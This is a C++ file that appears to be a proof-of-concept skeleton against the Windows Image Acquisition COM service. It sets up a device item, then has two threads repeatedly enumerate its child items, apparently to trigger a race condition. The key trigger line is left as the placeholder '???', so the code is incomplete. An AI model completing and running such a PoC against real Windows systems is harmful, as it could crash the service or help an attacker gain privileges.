#include<stdio.h>
#include<windows.h>
#include<wia_xp.h>
IWiaDevMgr* pWiaDevMgr;
IWiaItem* WiaItem;
IEnumWIA_DEV_INFO* ppIEnum;
IWiaPropertyStorage* pWiaPropertyStorage;
IEnumWiaItem* pEnumWiaItem;
PROPSPEC PropSpec[3] = { 0 };
PROPVARIANT PropVar[3] = { 0 };

HRESULT EnumerateWiaDevices(IWiaDevMgr* pWiaDevMgr) //Vista or later
{
    //
    // Validate arguments
    //
    if (NULL == pWiaDevMgr)
    {
        return E_INVALIDARG;
    }

    //
    // Get a device enumerator interface
    //
    IEnumWIA_DEV_INFO* pWiaEnumDevInfo = NULL;
    HRESULT hr = pWiaDevMgr->EnumDeviceInfo(WIA_DEVINFO_ENUM_LOCAL, &pWiaEnumDevInfo);
    if (SUCCEEDED(hr))
    {
        //
        // Loop until you get an error or pWiaEnumDevInfo->Next returns
        // S_FALSE to signal the end of the list.
        //
        while (S_OK == hr)
        {
            //
            // Get the next device's property storage interface pointer
            //
            ULONG size;
            hr = pWiaEnumDevInfo->Next(1, &pWiaPropertyStorage, &size);
            if (!size)
            {
                printf("No wia Device");
                getchar();
                exit(-1);
            }
 
        }

        //
        // If the result of the enumeration is S_FALSE (which
        // is normal), change it to S_OK.
        //
        if (S_FALSE == hr)
        {
            hr = S_OK;
        }

        //
        // Release the enumerator
        //
        pWiaEnumDevInfo->Release();
        pWiaEnumDevInfo = NULL;
    }

    //
    // Return the result of the enumeration
    //
    return hr;
}

HRESULT ReadSomeWiaProperties(IWiaPropertyStorage* pWiaPropertyStorage)
{
    //
    // Validate arguments
    //
    if (NULL == pWiaPropertyStorage)
    {
        return E_INVALIDARG;
    }

    //
    // How many properties are you querying for?
    //
    const ULONG c_nPropertyCount = sizeof(PropSpec) / sizeof(PropSpec[0]);

    //
    // Define which properties you want to read:
    // Device ID.  This is what you would use to create
    // the device.
    //
    PropSpec[0].ulKind = PRSPEC_PROPID;
    PropSpec[0].propid = WIA_DIP_DEV_ID;

    //
    // Device Name
    //
    PropSpec[1].ulKind = PRSPEC_PROPID;
    PropSpec[1].propid = WIA_DIP_DEV_NAME;

    //
    // Device description
    //
    PropSpec[2].ulKind = PRSPEC_PROPID;
    PropSpec[2].propid = WIA_DIP_DEV_DESC;

    //
    // Ask for the property values
    //
    HRESULT hr = pWiaPropertyStorage->ReadMultiple(c_nPropertyCount, PropSpec, PropVar);
    if (SUCCEEDED(hr))
    {

        FreePropVariantArray(c_nPropertyCount, PropVar);
    }

    //
    // Return the result of reading the properties
    //
    return hr;
}

HRESULT CreateWiaDevice(IWiaDevMgr* pWiaDevMgr, BSTR bstrDeviceID, IWiaItem** ppWiaDevice)
{
    //
    // Validate arguments
    //
    if (NULL == pWiaDevMgr || NULL == bstrDeviceID || NULL == ppWiaDevice)
    {
        return E_INVALIDARG;
    }

    //
    // Initialize out variables
    //
    *ppWiaDevice = NULL;

    //
    // Create the WIA Device
    //
    HRESULT hr = pWiaDevMgr->CreateDevice(bstrDeviceID, ppWiaDevice);

    //
    // Return the result of creating the device
    //
    return hr;
}


VOID WINAPI poc() {
    while (true)
    {
        HRESULT hr = WiaItem->EnumChildItems(&pEnumWiaItem);
        if (SUCCEEDED(hr))
        {
            pEnumWiaItem->???;
        }
    }
}
int main() {
    CLSID clsid;
    IID iid;

    CoInitializeEx(NULL, COINIT_MULTITHREADED);
    CLSIDFromString(L"{A1F4E726-8CF1-11D1-BF92-0060081ED811}", &clsid);
    IIDFromString(L"{5eb2502a-8cf1-11d1-bf92-0060081ed811}", &iid);

    HRESULT hr = CoCreateInstance(clsid, NULL, CLSCTX_LOCAL_SERVER, iid, (LPVOID*)&pWiaDevMgr);
    if (hr != S_OK)
    {
        printf("Create pWiaDevMgr ERROR %x\n", hr);
        getchar();//E_NOINTERFACE
        return 0;
    }
    hr = EnumerateWiaDevices(pWiaDevMgr);
    if (hr != S_OK)
    {
        printf("EnumerateWiaDevices ERROR %x\n", hr);
        getchar();
        return 0;
    }
    hr = ReadSomeWiaProperties(pWiaPropertyStorage);
    if (hr != S_OK)
    {
        printf("ReadSomeWiaProperties ERROR %x\n", hr);
        getchar();
        return 0;
    }

    const ULONG c_nPropertyCount = sizeof(PropSpec) / sizeof(PropSpec[0]);

    PropSpec[0].ulKind = PRSPEC_PROPID;
    PropSpec[0].propid = WIA_DIP_DEV_ID;
    PropSpec[1].ulKind = PRSPEC_PROPID;
    PropSpec[1].propid = WIA_DIP_DEV_NAME;
    PropSpec[2].ulKind = PRSPEC_PROPID;
    PropSpec[2].propid = WIA_DIP_DEV_DESC;

    hr = pWiaPropertyStorage->ReadMultiple(c_nPropertyCount, PropSpec, PropVar);
    if (hr != S_OK)
    {
        printf("ReadSomeWiaProperties ERROR %x\n", hr);
        getchar();
        return 0;
    }
    hr = CreateWiaDevice(pWiaDevMgr, PropVar[0].bstrVal, &WiaItem);
    if (hr != S_OK)
    {
        printf("CreateWiaDevice ERROR %x\n", hr);
        getchar();
        return 0;
    }

    LONG lItemType = 0;
    hr = WiaItem->GetItemType(&lItemType);
    if (hr != S_OK)
    {
        printf("GetItemType ERROR %x\n", hr);
        getchar();
        return 0;
    }
    if (lItemType & WiaItemTypeFolder || lItemType & WiaItemTypeHasAttachments)
    {
        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)poc, 0, 0, 0);
        poc();
    }

	return 0;
}
